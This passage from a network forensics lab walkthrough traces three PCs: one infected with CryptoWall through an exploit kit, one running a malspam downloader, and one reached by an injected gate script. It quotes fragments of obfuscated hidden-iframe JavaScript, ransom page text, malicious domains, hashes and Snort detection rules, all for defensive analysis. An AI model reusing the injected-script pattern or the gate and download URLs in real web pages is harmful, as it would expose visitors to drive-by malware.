### 3-5. The page the user opened (Arkime) { #pc-a-ransom }

**Why look at it?** The payload and the check-ins are encrypted. We know PC A is infected, but **not by what, or what the damage is**. This page was made for a human, so it is plain text. It answers four questions: what malware, what damage, is it really this PC, did the user see it.

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && host.http == 3wzn5p2yiumh7akj.waytopaytosystem.com
```

!!! warning "An Arkime session is one TCP connection, not one request"
    You get **7 sessions**, but none is "the GET at 22:16:46". The browser keeps a connection open (keep-alive) and sends several requests on it. The **Start Time** is when the connection opened, not when a request was sent. Find a request by its **source port**:

    | Request | Request time | Session (Src Port) |
    |---|---|---|
    | `GET /1f96s0p` | 22:16:46.032 | **49222** (Start 22:16:45) |
    | `GET /picture.php?k=1f96s0p&…` | 22:16:49.853 | **49228** |
    | `POST /1f96s0p` | 22:16:57.894 | **49226** (Start 22:16:48) |

    The URI list in the Info column is **not in time order** either.

Open both sessions with **natural** and **uncompress** (the pages are gzip and chunked).

**① Session 49222 — the first GET:**

```text
<title>Decrypt service</title>
Service to decrypt the files.
To continue please enter the code from the picture in the input field.
<img src="picture.php?k=1f96s0p&2fb0d914316c5ee97f49d0a673412155">
Code of picture: [5 characters]   [Enter to decrypt service]
```

- A **captcha** page with language flags (US, IT, FR, ES, DE) — the many `flags/*.png` requests.
- The script hides an element called `tor2web-header`. **[inference]** tor2web lets a normal browser reach a Tor hidden service; `3wzn5p2yiumh7akj` has the 16 characters of a 2016 `.onion` name. The real server is inside Tor — blocking this IP does not stop it.

**② Session 49226 — the POST (scroll past `es.png`, `rb.png`, `favicon.ico`):**

```text
POST /1f96s0p HTTP/1.1
Content-Length: 14

pic_code=T7z5W
```

```text
Your files are encrypted.
To get the key to decrypt files you have to pay 500 USD. If payment is not made before 14/01/16 - 16:16
the cost of decrypting files will increase 2 times and will be 1000 USD/EUR
Your system: Windows 7 (x64)   First connect IP: 103.12.9.206  [AU flag]
We are present a special software - CryptoWall Decrypter - ...
Send 1.14 BTC to Bitcoin address: 16VXHKKtwGx8YG9qaEqszCLscUxtm326LZ
Your payments not found.
```

The page script starts `back_timer('back_timer', 604800)` — 604,800 s = **7 days**.

**[data] Answers:**

| Question | Answer |
|---|---|
| What malware? | **CryptoWall** — the page names "CryptoWall Decrypter" |
| What damage? | **Files encrypted**, 500 USD (1.14 BTC), doubles after 7 days. No payment yet ("Your payments not found") |
| This PC? | "Windows 7 (x64)" matches the User-Agent `Windows NT 6.1; WOW64`. **[inference]** `103.12.9.206` is the network's public (NAT) IP, recorded at the first check-in; the AU flag fits a PC that uses `google.com.au` |
| Did the user see it? | **Yes.** The user typed the captcha (`pic_code=T7z5W`). The visit had no Referer: **[inference]** the address came from the ransom note on the PC |

!!! note "Use the capture time, not the server's `Date:`"
    The server's `Date:` header says 22:17:14 for a reply captured at 22:16:48 — the server clock is about 26 s off. Times in a report come from `ts` / the capture.

**Conclusion for PC A:**

- **[data]** Google result → hacked koeppl.com → hidden iframe → EK landing → Flash → encrypted payload → new `MSIE 7.0` program checking in to hacked sites (C2 list) → the user opened the CryptoWall payment page and typed its captcha.
- **[inference]** A drive-by download: the only click was the Google result. Files on Hokaydoo-PC are encrypted by **CryptoWall**; network shares it could write to may also be affected. Tell the response team before anyone pays.

---

## Step 4 — PC B: 192.168.122.130 FULL-METAL-JACK { #pc-b }

### 4-1. The script's requests { #pc-b-requests }

Step 1 showed .130 using `MSIE 7.0` from 22:11:53 (9 requests). Spread them out:

```spl
index=zeek sourcetype=zeek:http id_orig_h=192.168.122.130 user_agent="*MSIE 7.0*"
| eval time=strftime(ts, "%H:%M:%S.%3N")
| table time, id_resp_h, host, uri, referrer, status_code, resp_mime_types, response_body_len
| sort time
```

- Line 1: `user_agent="*MSIE 7.0*"` — `*` = any text before or after.
- Line 2: `eval` makes a new field: `ts` as `22:11:53.882`. `%3N` = milliseconds.
- Line 3: `table` shows only these fields, in this order.

**What you should see (the long `id=` shortened):**

```text
time          id_resp_h       host                             uri                          status  resp_mime_types        response_body_len
22:11:53.882  216.158.85.7    ma-wt.com.sa                     /counter/?id=5553…5E55&rnd=8742951  200                          0
22:11:55.525  174.36.186.235  dariostoka.com                   /counter/?id=5553…5E55&rnd=8742951  200                          0
22:11:57.453  184.168.173.1   freshanointingministries-sc.org  /counter/?id=5553…5E55&rnd=8742951  200                          0
22:11:58.285  216.158.85.7    ma-wt.com.sa                     /counter/?id=5553…5E55&rnd=8742952  200     application/x-dosexec  260613
22:12:04.091  174.36.186.235  dariostoka.com                   /counter/?id=5553…5E55&rnd=8742952  200     application/x-dosexec  260613
22:12:21.976  184.168.173.1   freshanointingministries-sc.org  /counter/?id=5553…5E55&rnd=8742952  200     application/x-dosexec  260619
22:12:30.633  216.158.85.7    ma-wt.com.sa                     /counter/?id=5553…5E55&rnd=8742953  200     application/x-dosexec  114688
22:12:34.317  174.36.186.235  dariostoka.com                   /counter/?id=5553…5E55&rnd=8742953  200     application/x-dosexec  114688
22:12:47.942  184.168.173.1   freshanointingministries-sc.org  /counter/?id=5553…5E55&rnd=8742953  200     application/x-dosexec  145922
```

**[data] Reading:**

- **The same `id=` on all 9.** `rnd=` is not random: it **counts up by one** per round (…51, …52, …53). **[inference]** `id` = who is asking, `rnd` = "give me file number N".
- **No `referrer` field at all** — Zeek leaves empty fields out of JSON, so there was **no Referer**: a program, not a web page.
- Round 1 returned **0 bytes** everywhere; rounds 2 and 3 returned **Windows programs** (`application/x-dosexec`).
- **The same site order every round**, and it downloads from all three even after the first one worked. Unlike PC A's C2 (try the next server only on failure), this script walks a **list of mirrors**. The whole run took **54 s**.

### 4-2. Decoding `id=` (CyberChef) { #pc-b-id }

```text
55535C5E06160B0B0F014A0C05090D08100B0A241605070F17140507014A070B4A110F5E3C5E170503010901000D054A0B16035E17555E55505156555C5C5653525E55
```

- Only `0-9 A-F` → **hex**. 136 characters = 68 bytes.
- Decoded as hex it is unreadable, but some bytes repeat (`4A` several times). Real encryption rarely repeats like that; a **1-byte XOR** does — the same character always turns into the same byte.

CyberChef: **From Hex** → **XOR Brute Force** (Key length **1**, Sample length **100**, Print key **on**). Add the crib `.co` to keep only matching lines.

```text
Key = 64: 178:brooke.hamilton@rackspace.co.uk:X:sagemedia.org:s1:1452188276:1
```

| Part | Value | Meaning |
|---|---|---|
| 2 | `brooke.hamilton@rackspace.co.uk` | **an email address** [data] |
| 4 | `sagemedia.org` | a domain — **[inference]** sender side or campaign mark |
| 6 | `1452188276` | **Unix time** = 2016-01-07 **17:37:56** UTC (`| makeresults | eval t=strftime(1452188276,"%Y-%m-%d %H:%M:%S")`) |
| 1, 3, 5, 7 | `178`, `X`, `s1`, `1` | unknown — **[inference]** campaign or version marks |

**[inference] Why it matters:** the script carries an email address and a time **4.5 h before** it ran. That fits a file **made for an email** and opened later — evidence for "malspam attachment" even though the mail itself is hidden in HTTPS. The mail team can search for the address or `sagemedia.org` to find other recipients. Whether it is the user's own address is not visible (the user used Yahoo Mail).

### 4-3. The downloads: "GIF" files that are programs (Splunk + Arkime) { #pc-b-downloads }

```spl
index=zeek sourcetype=zeek:files rx_hosts="192.168.122.130" mime_type="application/x-dosexec"
| eval time=strftime(ts, "%H:%M:%S.%3N")
| table time, tx_hosts, filename, seen_bytes, md5, sha256
| sort time
```

```text
time          tx_hosts        filename              seen_bytes  md5
22:11:58.680  216.158.85.7    66b32.gif             260613      9f756e72eacc6b805481a49ce51c4a79
22:12:04.612  174.36.186.235  174125.gif            260613      9f756e72eacc6b805481a49ce51c4a79
22:12:22.606  184.168.173.1   c9a63078fe7d3741.gif  260619      d411bf37de7f72e98a62fc82917f50f7
22:12:31.277  216.158.85.7    250acae.gif           114688      e851eb249d2c38d56d1b496a3112cebc
22:12:35.088  174.36.186.235  d50f729942631.gif     114688      e851eb249d2c38d56d1b496a3112cebc
22:12:48.574  184.168.173.1   2487ff63fb4e79.gif    145922      92a4d0aeede3ce110b4121342df48496
```

Group identical files:

```spl
index=zeek sourcetype=zeek:files rx_hosts="192.168.122.130" mime_type="application/x-dosexec"
| stats count, values(tx_hosts) as servers, values(seen_bytes) as size by md5
```

- `stats … by md5` = one group per file fingerprint. `values(tx_hosts) as servers` = which servers sent it.

**[data] 6 downloads, 4 different EXEs.** ma-wt and dariostoka gave **the same file** for the same `rnd` (same MD5) — **[inference]** one file placed on several hacked sites. freshanointing gave different files. Every name is **random + `.gif`**, different per site even for the same file.

SHA256 (for the host team):

```text
95a9c8fccbe0e49dc132cf59d7ebf73e692da9f35491e0bfcac40b92c9022f5c  (260,613 B)
220a2e4f93d85f16dd74ed56247644e126b8d2d262374c4f09ec2be49cbcd0f3  (260,619 B)
306ab541cf4ace30c0f905ded4c26b40458c4dda28d9c5f00abd679ada6cf27d  (114,688 B)
227193160a2448dfa8bbbd2cf125afa9cca0d1a718b109a3adae5df8a24cdf6e  (145,922 B)
```

What did the server **say**? Arkime:

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.130 && http.uri == */counter/*
```

```text
HTTP/1.1 200 OK                                   ← round 1 (rnd=…51)
Content-Type: text/html
Content-Encoding: gzip
Content-Length: 119                               ← 119 B of gzip = 0 B unzipped

HTTP/1.1 200 OK                                   ← round 2 (rnd=…52), same connection
Content-Length: 260613
Content-Type: image/gif
Server: Microsoft-IIS/7.5
X-Powered-By: PHP/5.3.28
Content-Disposition: attachment; filename=66b32.gif

MZ…This program cannot be run in DOS mode…PE…text…data…rsrc
```

| | The server said | The content (Zeek) |
|---|---|---|
| Type | `image/gif` | `application/x-dosexec` |
| Name | `.gif` | a Windows EXE (`MZ`, `PE`, `.text`, `.rsrc`) |

**[inference]** A disguise for filters that only read the extension or `Content-Type`. Trust Zeek's `mime_type` (from content), not the label. Note that one Arkime session (port 49220) holds **both** round 1 and round 2 — keep-alive again.

### 4-4. Before the script: webmail over HTTPS { #pc-b-webmail }

Email is HTTPS, so contents are hidden. The **SNI** (the server name sent in clear before encryption) still shows which service was used and when.

```spl
index=zeek sourcetype=zeek:ssl id_orig_h=192.168.122.130
| stats min(ts) as first, max(ts) as last, count by server_name
| eval first=strftime(first, "%H:%M:%S.%3N"), last=strftime(last, "%H:%M:%S.%3N")
| sort first
```

- Line 2: one row per SNI: first connection, last connection, number of connections.
- Line 3: both times readable in one `eval` (comma-separated).

```text
server_name                first         last          count
www.bing.com               22:06:35.382  22:06:59.726  11
login.live.com             22:06:41.475  22:07:03.451  2
us-mg5.mail.yahoo.com      22:07:00.155  22:16:54.459  12
mail.yahoo.com             22:07:01.903  22:07:37.178  2
login.yahoo.com            22:07:05.562  22:07:33.619  5
prodxobni.mail.yahoo.com   22:08:13.677  22:08:13.894  2
ws-contacts.progrss.yahoo.com  22:08:13.894  22:08:13.894  2
… (other *.yahoo.com, *.yimg.com)
```

**[data]** Bing → **Yahoo Mail** login at 22:07. The mail server `us-mg5` runs **until 22:16:54 — after the downloads**. So "last mail connection" says nothing yet: `stats` shows only the first and last of 12 connections.

### 4-5. Is the webmail traffic the user, or the page itself? { #pc-b-rhythm }

```spl
index=zeek sourcetype=zeek:ssl id_orig_h=192.168.122.130 server_name="us-mg5.mail.yahoo.com"
| sort ts
| delta ts as gap
| eval time=strftime(ts, "%H:%M:%S.%3N"), gap=round(gap, 1)
| table time, id_orig_p, id_resp_h, gap
```

- Line 2 **must** come before `delta`: `delta` compares each row with the row **above** it.
- `delta ts as gap` = this row's `ts` minus the previous row's `ts` = seconds since the last connection.
- `round(gap, 1)` = one decimal.

```text
time          id_orig_p  gap
22:07:00.155  49174
22:08:33.335  49210      93.2
22:10:42.271  49216      128.9
22:10:42.274  49217      0.0
22:11:45.130  49219      62.9
22:11:47.467  49218      2.3
22:13:48.903  49227      121.4
22:13:49.157  49228      0.3
22:14:51.292  49230      62.1
22:14:54.025  49229      2.7
22:16:54.459  49231      120.4
22:16:54.459  49232      0.0
```

**[data] A rhythm:** from 22:10:42 the connections come **in pairs**, about **2 min → 1 min → 2 min → 1 min** apart. People do not click to a clock. **[inference]** The Yahoo Mail page checking for new mail **by itself**. The pair at 22:11:45/47 — 6 s before the first download — is part of that rhythm, so it is **not** a user action. The real user activity (login, mail, contacts) ends at about **22:08:47**.

!!! warning "Trap: Arkime's graph puts a session's bytes at its **end**"
    In Arkime (`ip.src == 192.168.122.130 && port.dst == 443`, graph **Data bytes** + **Bars**) there is one huge bar of **1,650,773 bytes at 22:10:42**. It looks like a big download at 22:10:42. It is not: the two connections opened then have 9 and 6 packets. Check which connections **ended** then:

    ```spl
    index=zeek sourcetype=zeek:conn id_orig_h=192.168.122.130 id_resp_p=443
    | eval end=ts+duration
    | where end>=1452204641 AND end<1452204643
    | eval start=strftime(ts, "%H:%M:%S"), end=strftime(end, "%H:%M:%S.%3N")
    | table start, end, id_orig_p, id_resp_h, resp_bytes
    | addcoltotals resp_bytes
    ```

    - `end = ts + duration` = when each connection closed. `where` keeps 22:10:41–22:10:43. `addcoltotals` adds a total row.
    - **[data] 19 connections**, opened 22:06:59–22:08:47, all **closed at 22:10:41.8–22:10:42.9**; total `resp_bytes` **1,646,923** ≈ the Arkime bar. The graph places all of a session's bytes at its **last packet** (the **Bounding: Last Packet** setting). The real mail data flowed 22:07–22:09.

### 4-6. Anything new after the downloads? { #pc-b-after }

Destinations **first seen** after 22:11:53 — over the whole capture, so "seen before" is known:

```spl
index=zeek sourcetype=zeek:conn id_orig_h=192.168.122.130
| stats min(ts) as first_seen, count, sum(resp_bytes) as resp_bytes by id_resp_h, id_resp_p
| where first_seen>=1452204713
| eval first_seen=strftime(first_seen, "%H:%M:%S.%3N")
| sort first_seen
```

- No time filter on line 1 — on purpose. Line 3 keeps destinations whose **first** contact is after 22:11:53 (1452204713). Compare **before** turning the number into text (line 4).

```text
id_resp_h       id_resp_p  first_seen    count  resp_bytes
216.158.85.7    80         22:11:53.451  1      376115
174.36.186.235  80         22:11:55.008  3      376181
184.168.173.1   80         22:11:57.052  3      407337
```

Then every connection after the last download:

```spl
index=zeek sourcetype=zeek:conn id_orig_h=192.168.122.130 ts>1452204768
| eval time=strftime(ts, "%H:%M:%S.%3N")
| table time, id_resp_h, id_resp_p, service, conn_state, orig_bytes, resp_bytes
| sort time
```

**[data] Reading:**

- The only new destinations are the **3 download sites**. ma-wt has **1 connection** for 3 requests (keep-alive).
- After 22:12:48: **8 connections, all 443** — `124.108.101.10` (us-mg5, **the same 2,019 / 1,499 bytes each time** = automatic), and two Yahoo IPs used before with 0 / 0 bytes. The last two are `S1` (still open when the capture ended).
- **No DNS, no HTTP, no new User-Agent.**

**Conclusion for PC B:**

- **[data]** During a Yahoo Mail session, a script (`MSIE 7.0`, no Referer) downloaded 4 different Windows programs (6 downloads) disguised as GIFs from 3 hacked websites. The script's `id=` carries an email address and a time 4.5 h earlier.
- **[inference]** A **malspam attachment** (likely `.js`). When it was opened is not visible (HTTPS). No follow-up traffic in the remaining 4 minutes: the EXEs may not have run yet, or may connect later. **Treat the PC as infected**; check the mailbox and the PC.

---

## Step 5 — PC C: 192.168.122.52 Jennifer-PC { #pc-c }

### 5-1. From a search to a gate { #pc-c-chain }

```spl
index=zeek sourcetype=zeek:http id_orig_h=192.168.122.52 ts>=1452204540 ts<1452204580
| eval time=strftime(ts, "%H:%M:%S.%3N")
| table time, host, uri, referrer, status_code, resp_mime_types, response_body_len
| sort time
```

- `ts>=` and `ts<` together make a time window: **22:09:00 – 22:09:40**.

**What you should see (key rows):**

```text
time          host                 uri                                    referrer                                         len
22:09:01.063  l.yimg.com           /pv/static/lib/srp-core-js-…js          http://au.search.yahoo.com/search?p=planetside.co.uk…  306566
22:09:05.759  ri.search.yahoo.com  /_ylt=…/RU=http://planetside.co.uk//…  http://au.search.yahoo.com/search?p=planetside.co.uk…  (302)
22:09:12.190  planetside.co.uk     /                                      http://au.search.yahoo.com/search?p=…            23509
22:09:20.017  planetside.co.uk     /media/system/js/mootools-core.js      http://planetside.co.uk/                         99877
22:09:23.764  planetside.co.uk     /media/system/js/core.js               http://planetside.co.uk/                         4784
22:09:24.829  st.domandvilma.com   /fvviewforumqn.php                     http://planetside.co.uk/                         26
22:09:26.423  planetside.co.uk     /media/system/js/caption.js            http://planetside.co.uk/                         729
22:09:27.331  ajax.googleapis.com  /ajax/libs/jquery/1.11.3/jquery.min.js http://planetside.co.uk/                         95992
…             planetside.co.uk / ajax.aspnetcdn.com (more scripts and styles)
```

**[data] Reading:**

- The user **searched Yahoo for "planetside.co.uk"** and clicked the result: `ri.search.yahoo.com` answers **302** with `RU=http://planetside.co.uk//` (Yahoo records the click, then forwards). A deliberate visit, like PC A.
- **22:09:24 — `st.domandvilma.com/fvviewforumqn.php`**, Referer = the planetside page. **The reply is only 26 bytes** — too small for an EK landing page (PC A's was 1,035 B).
- After it: only planetside and Google/Microsoft CDNs (`googleapis`, `aspnetcdn`). The two `googleapis` 404s are old links on the site, not the attack.
- **The Referer names the page, not the script.** Every script on the page sends the same Referer. The candidates by time are `mootools-core.js` (4.8 s before) and `core.js` (1.1 s before) — read them.

### 5-2. Which file called the gate? (Arkime) { #pc-c-inject }

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.52 && http.uri == [planetside.co.uk/media/system/js/mootools-core.js, planetside.co.uk/media/system/js/core.js]
```

- `[a, b]` = either value. Remember: Arkime's `http.uri` includes the host.

**`core.js` — clean.** Normal **Joomla** code (`Joomla.submitform`, `Joomla.checkAll` …), nothing that calls another domain.

**`mootools-core.js` — injected at the end.** MooTools is a well-known public library; attackers add code at the **start or end** of a file. Right after the library's last line (`…return eval(rs);}})();`) there is code between two random comments:

```text
/* S4PoQHwRAGy */var jcvJp4p="\x75se\u0072\x69dA08\u00317FB25";var oD4RG9="30";
...
tdxwSOD.src="\x68ttp:\x2f/st.do\x6da\u006edvilm\x61.com\x2f"+j7aMn(2,6)+"v\u0069\x65wforum"+j7aMn(2,6)+"\u002ephp";
...
if(main_color_handle.length==0){xco56v_(jcvJp4p,oD4RG9,48);return;}
...
var FCPKqK="<iframe on\x6co\x61d=\u0027\x6d\u0045J\u0074\x51o(\x29;\u0027 src=\u0027"+mClKFF+"'\u0020w\x69dth=19 hei\u0067\x68\x74\x3d1\x39 \x66ramebor\u0064er=0 scroll\x69\u006eg=\u0027no\x27>\u003c/iframe>";
... /* DwRn2gPflETI4EP3B6B */
```

Ctrl+F for `domandvilma` finds **nothing** — the name is hidden with escape codes. That is a clue too.

**How to read the escapes:** `\xNN` = the character with hex code NN (`\x68` = `h`, `\x2f` = `/`, `\x6d` = `m`, `\x61` = `a`). `\uNNNN` = the same with 4 digits (`\u006e` = `n`, `\u0069` = `i`, `\u002e` = `.`).

| Code | Decoded | Meaning |
|---|---|---|
| `"\u0057in\x64ows"`, `"MSI\u0045"`, `"\u0047ec\u006bo"`, `"Trid\u0065n\u0074"` | Windows, MSIE, Gecko, Trident | Only **Windows + a normal browser** |
| `tdxwSOD.src = "http://st.domandvilma.com/" + j7aMn(2,6) + "viewforum" + j7aMn(2,6) + ".php"` | the gate URL | `j7aMn(2,6)` = **2–6 random letters** |
| `"SCR\u0049\x50T"` | SCRIPT | The gate is loaded as a `<script>` |
| `if(main_color_handle.length==0){ … return; }` | empty value → stop | |
| `<iframe … width=19 height=19 frameborder=0 scrolling='no'>` | a 19×19 iframe | otherwise: a hidden iframe to the gate's address |
| `"op\u0061\u0063ity:0"` | opacity:0 | fully transparent |

**[data] Match it:** the real request was `/fvviewforumqn.php` = `fv` + **`viewforum`** + `qn` + `.php`. The injected code in **mootools-core.js** made the gate request.

**The gate's reply:**

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.52 && host.http == st.domandvilma.com
```

```text
GET /fvviewforumqn.php HTTP/1.1
Accept: application/javascript, */*;q=0.8
Referer: http://planetside.co.uk/
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
Host: st.domandvilma.com

HTTP/1.1 200 OK
Server: nginx/1.8.0
Content-Type: text/javascript; charset=ISO-8859-1
P3P: policyref="/w3c/p3p.xml", CP="NON DSP COR NID DEVa PSAa PSDa OUR BUS"
Set-Cookie: fltna=…; expires=Fri, 06-Jan-2017 22:09:22 GMT; path=/; domain=st.domandvilma.com
Content-Encoding: gzip

var main_color_handle='';
```

- `Accept: application/javascript` — the browser asked for it **as a script** (matches `SCRIPT` in the code).
- `Set-Cookie` for 1 year + `P3P` — **[inference]** IE blocks third-party cookies unless a P3P header is present; the gate wants to **recognise the visitor next time**.
- Body: `var main_color_handle='';` — **26 bytes, an empty value**. The variable the injected code waits for is empty, so it takes the `length==0` branch: no iframe.

**[inference] Why empty?** Gates choose who to attack (browser, country, IP, seen before). This visit was filtered out. The rules live on the server and cannot be seen.

### 5-3. Proof that the code ran — the cookie (Arkime) { #pc-c-cookie }

Same method as PC A (3-2): **what must the code leave behind if it ran?** With an empty gate value it calls `xco56v_(jcvJp4p, oD4RG9, 48)`. `xco56v_` writes `document.cookie` with `expires` and `domain=` + `document.domain` (= **planetside.co.uk**). The name and value are at the top of the code:

```text
"\x75se\u0072\x69dA08\u00317FB25"  →  u se r i dA08 1 7FB25  →  useridA0817FB25
oD4RG9 = "30"
```

So the code should create **`useridA0817FB25=30`** for 48 hours. Compare the `Cookie:` line of planetside requests before and after the gate:

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.52 && host.http == planetside.co.uk
```

| Time | Request (planetside.co.uk) | Cookie |
|---|---|---|
| 22:09:23.764 | `core.js` (port 49199) | `f602a8df…=c869e74f…` |
| *22:09:24.829* | *gate request* | |
| 22:09:26.423 | `caption.js` (port 49202) | `f602a8df…=c869e74f…` |
| 22:09:29.950 | `jquerynoconflict.js` (port 49203) | `f602a8df…=c869e74f…; `**`useridA0817FB25=30`** |

**[data] Reading:**

- The new cookie appears **after** the gate request, with exactly the name and value from the code.
- **No response in the capture contains `Set-Cookie: useridA08…`** — the browser's script made it, not a server.
- `caption.js` (22:09:26) does not have it yet. **[inference]** The browser requested `caption.js` before the gate reply finished and the script's `onload` ran.
- Conclusion: **the injected code ran, got an empty value, set its cookie and stopped.** For 48 hours it will not even ask the gate again (`if(demsFw(jcvJp4p)==oD4RG9){return false;}`).

### 5-4. The rest of .52's traffic { #pc-c-rest }

To write "not infected", check that nothing **is** there.

```spl
index=zeek sourcetype=zeek:http id_orig_h=192.168.122.52
| stats min(ts) as first_seen, count, sum(response_body_len) as bytes by host
| where first_seen>=1452204564
| eval first_seen=strftime(first_seen, "%H:%M:%S.%3N")
| sort first_seen
```

```text
host                      first_seen    count  bytes
st.domandvilma.com        22:09:24.829  1      26
ajax.aspnetcdn.com        22:09:29.473  1      7203
www.google-analytics.com  22:09:50.429  5      70606
www.outdoorsamoa.com      22:15:29.043  30     574893
fonts.googleapis.com      22:15:31.719  2      1335
fonts.gstatic.com         22:15:37.251  6      207328
www.tripadvisor.com       22:15:37.251  4      31229
www.jscache.com           22:15:48.672  3      534
static.tacdn.com          22:15:50.974  8      30759
www.tripadvisor.co.nz     22:15:52.968  1      406
```

```spl
index=zeek sourcetype=zeek:files rx_hosts="192.168.122.52"
| stats count, max(seen_bytes) as max_bytes by mime_type
| sort - count
```

```spl
index=zeek sourcetype=zeek:http id_orig_h=192.168.122.52
| stats count, min(ts) as first by user_agent
| eval first=strftime(first, "%H:%M:%S")
```

- `sort - count` = largest first.

**[data] Reading:**

- New domains after the gate are CDNs and Google Analytics; **6 min later** another site (`outdoorsamoa.com`, a Samoa travel site — its Referer carries `?gclid=…`, **[inference]** a Google ad click) with Google Fonts and TripAdvisor widgets. No random sub-domains or odd TLDs.
- File types: text, HTML, images, fonts, JavaScript only. **No `application/x-dosexec`, no Flash.** The largest `text/plain` (306,566 B) is Yahoo's search script.
- User-Agents: IE 9 (202) and `Microsoft NCSI` (Windows' "am I online?" check at 22:06:13). **No `MSIE 7.0`.**

**Conclusion for PC C:** **[data]** The same kind of attack as PC A started (hacked site → injected code → gate), but the gate answered with nothing, the code stopped, and no exploit, download or new program followed. **Not infected.** The site is still hacked — block the gate and tell the site owner.

---

## Step 6 — Simple Snort rules and a test { #snort }

One very simple rule per malicious activity:

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"EK securetopc.top - Sung"; content:"securetopc.top"; nocase; sid:1000051; rev:1;)
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"JS downloader counter id - Sung"; content:"/counter/?id="; nocase; sid:1000052; rev:1;)
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"Gate domandvilma.com - Sung"; content:"domandvilma.com"; nocase; sid:1000054; rev:1;)
```

- `alert tcp` — raise an alert on a matching TCP packet.
- `$HOME_NET any -> $EXTERNAL_NET 80` — inside (private ranges) to outside port 80: the PC's HTTP requests.
- `content:"…"` + `nocase` — this text anywhere in the packet, any case.
- `sid` 1000000+ = your own rules; `rev` = rule version.

Add each rule on **one line** to `\\10.50.10.60\rules\local.rules`, then on pcapbox:

```bash
snort-test 20160107_ALERTS_ON_3_DIFFERENT_HOSTS
```

**What you should see:**

```text
[1/2] 문법 OK
[2/2] /data/pcap/20160107_ALERTS_ON_3_DIFFERENT_HOSTS.pcap
  count [gid:sid:rev] message
      9 [1:1000052:1] JS downloader counter id - Sung
      5 [1:1000051:1] EK securetopc.top - Sung
      1 [1:1000054:1] Gate domandvilma.com - Sung
```

**[data] Reading:** every count equals the number of requests found in the analysis — 9 `/counter/` requests (4-1), 5 requests to securetopc.top (landing, `.swf` twice, `/surprise`, `/officer`), 1 gate request (5-1). Snort raises one alert per matching packet, and each request fits in one packet. No extra alerts from other traffic. To see source IPs:

```spl
index=snort sourcetype=snort:alert pcap_case="20160107_ALERTS_ON_3_DIFFERENT_HOSTS"
| stats count, min(_time) as first, max(_time) as last, values(src_ip) as src, values(dest_ip) as dest by sid, msg
| eval first=strftime(first, "%H:%M:%S"), last=strftime(last, "%H:%M:%S")
```

These rules fit **this** case. Attackers change domains often; next campaign they may not match.

---

## Timeline (2016-01-07, UTC) { #timeline }

| Time | PC | Event |
|---|---|---|
| 22:05:47 | all | Capture starts; DHCP for .130, .52 (22:06:02), .132 (22:06:21) |
| 22:06:35 | B .130 | Bing |
| 22:07:00–22:08:47 | B .130 | Yahoo Mail login and use (HTTPS); after that only automatic refresh every 1–2 min |
| 22:09:01–05 | C .52 | Yahoo search for planetside.co.uk, click (302) |
| 22:09:12 | C .52 | `planetside.co[.]uk` (hacked; injected code at the end of `mootools-core.js`) |
| 22:09:24 | C .52 | Gate `st.domandvilma[.]com` → `var main_color_handle='';` → cookie `useridA0817FB25=30`, **nothing follows** |
| 22:10:08–10 | A .132 | Google result → `www.koeppl[.]com` (hacked, code before `<html>`) |
| 22:10:13 | A .132 | Script's cookies `PHP_SESSION_PHP` appear in koeppl requests |
| 22:10:15 | A .132 | Hidden iframe → EK landing `uacltr.securetopc[.]top` (89.38.144.75) |
| 22:10:17 | A .132 | Flash exploit (83 KB) |
| 22:10:26 | A .132 | Encrypted payload (412 KB) from `gbesbsdsb.securetopc[.]top` |
| 22:10:47–22:12:14 | A .132 | `MSIE 7.0` encrypted check-ins to `bizsouls[.]com`, then the same message to `estudiobarco.com[.]ar` |
| 22:11:53–22:12:47 | B .130 | Script `/counter/?id=` × 9 → 6 EXEs named `.gif` (4 unique) |
| 22:15:29 | C .52 | Normal browsing (outdoorsamoa, TripAdvisor) |
| 22:16:46–22:16:57 | A .132 | User opens the **CryptoWall "Decrypt service"** page, types the captcha → "Your files are encrypted", 500 USD |
| 22:17:18 | all | Capture ends |

---

## Indicators { #iocs }

| Indicator | Type | PC | Role |
|---|---|---|---|
| `www.koeppl[.]com` 92.51.131.150 | domain / IP | A | Hacked site (code before `<html>`) |
| `uacltr.securetopc[.]top`, `gbesbsdsb.securetopc[.]top` 89.38.144.75 | domain / IP | A | Exploit kit (landing, Flash, payload) |
| `bizsouls[.]com` 188.138.101.154, `estudiobarco.com[.]ar` 50.22.11.55 | domain / IP | A | CryptoWall check-ins (hacked sites) |
| `3wzn5p2yiumh7akj.waytopaytosystem[.]com` 95.128.181.144 | domain / IP | A | CryptoWall payment page (tor2web) |
| 6631e8c0d5f07004fabff81872f10d5e | MD5 | A | Flash exploit |
| 4fd5e80b20ea9d39925155d9f8b2aa1d | MD5 | A | Check-in body sent to both C2 sites |
| 16VXHKKtwGx8YG9qaEqszCLscUxtm326LZ | Bitcoin address | A | Ransom payment |
| `ma-wt.com[.]sa` 216.158.85.7, `dariostoka[.]com` 174.36.186.235, `freshanointingministries-sc[.]org` 184.168.173.1 | domain / IP | B | EXE downloads (`/counter/?id=`) |
| 9f756e72…4a79, d411bf37…7f50f7, e851eb24…cebc, 92a4d0ae…8496 | MD5 | B | Downloaded EXEs (4) |
| `brooke.hamilton@rackspace.co.uk`, `sagemedia.org` | inside `id=` | B | Campaign data for the mail team |
| `planetside.co[.]uk` 67.225.139.108 | domain / IP | C | Hacked site (injected `mootools-core.js`) |
| `st.domandvilma[.]com` 192.185.21.183 | domain / IP | C | Gate (returned nothing) |

---

## Copy-ready queries { #query-sheet }

Replace `<case>` with your case name.

```spl
index=zeek pcap_case=<case> | stats count by sourcetype | sort - count
index=zeek sourcetype=zeek:conn pcap_case=<case> | stats min(ts) as first max(ts) as last count as sessions | eval duration_min=round((last-first)/60,1) | eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
